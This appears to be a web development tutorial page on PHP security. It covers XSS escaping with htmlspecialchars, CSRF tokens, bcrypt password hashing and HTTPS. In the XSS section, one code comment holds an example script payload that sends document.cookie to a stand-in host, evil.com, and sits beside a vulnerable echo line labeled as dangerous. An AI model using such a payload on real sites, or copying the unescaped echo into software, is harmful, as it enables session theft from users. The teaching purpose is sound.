<h1>Web Application Security (Advanced)</h1>
<p>Security is not a feature; it is a fundamental requirement. Beyond SQL Injection, there are several other common attacks that every web developer must defend against.</p>

<h2>1. Cross-Site Scripting (XSS)</h2>
<p>XSS happens when you output data from a user to a page without cleaning it. An attacker can inject a script that steals cookies or redirects users to a fake login page.</p>

<pre><code class="language-php">&lt;?php
  // DANGEROUS: If $name is "&lt;script&gt;fetch('https://evil.com?c=' + document.cookie)&lt;/script&gt;"
  echo "Hello " . $_GET['name']; 
  
  // SECURE: Converts special characters to HTML entities
  echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?&gt;</code></pre>

<h2>2. Cross-Site Request Forgery (CSRF)</h2>
<p>CSRF is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently authenticated (like changing their password or making a purchase).</p>

<div class="alert alert-info">
    <strong>The Defense:</strong> Use a **CSRF Token**. This is a secret, unique, and unpredictable string that the server generates for the user's session. Every form must include this token.
</div>

<pre><code class="language-php">&lt;?php
  session_start();
  // Generate token if it doesn't exist
  if (empty($_SESSION['csrf_token'])) {
      $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
  }
?&gt;

&lt;!-- Include in Every Form --&gt;
&lt;form method="POST"&gt;
  &lt;input type="hidden" name="csrf_token" value="&lt;?php echo $_SESSION['csrf_token']; ?&gt;"&gt;
  &lt;!-- other inputs --&gt;
&lt;/form&gt;</code></pre>

<h2>3. Secure Password Storage</h2>
<p>Never, under any circumstances, store a password in plain text or using a simple hash like MD5 or SHA1. Attackers can "crack" these in seconds.</p>

<h3>The Correct Way (Bcrypt)</h3>
<p>PHP handles the "salting" and "hashing" for you automatically using <code>password_hash()</code>.</p>

<pre><code class="language-php">&lt;?php
  $password = "UserSecret123";
  
  // Hash the password for storage in the DB
  $hashed = password_hash($password, PASSWORD_DEFAULT);
  
  // When logging in, verify the provided password against the hash
  if (password_verify($password, $hashed)) {
      echo "Access Granted!";
  } else {
      echo "Access Denied!";
  }
?&gt;</code></pre>

<div class="alert alert-warning">
    <strong>Pro Rule:</strong> Never write your own cryptography code. Use the standard libraries provided by PHP and follow the OWASP (Open Web Application Security Project) guidelines.
</div>

<h2>HTTPS & SSL</h2>
<p>Even if your code is secure, an attacker could steal data as it travels through the air (Wi-Fi) or over wires. Always obtain an SSL certificate (e.g., via Let's Encrypt) to ensure all traffic is encrypted with HTTPS.</p>
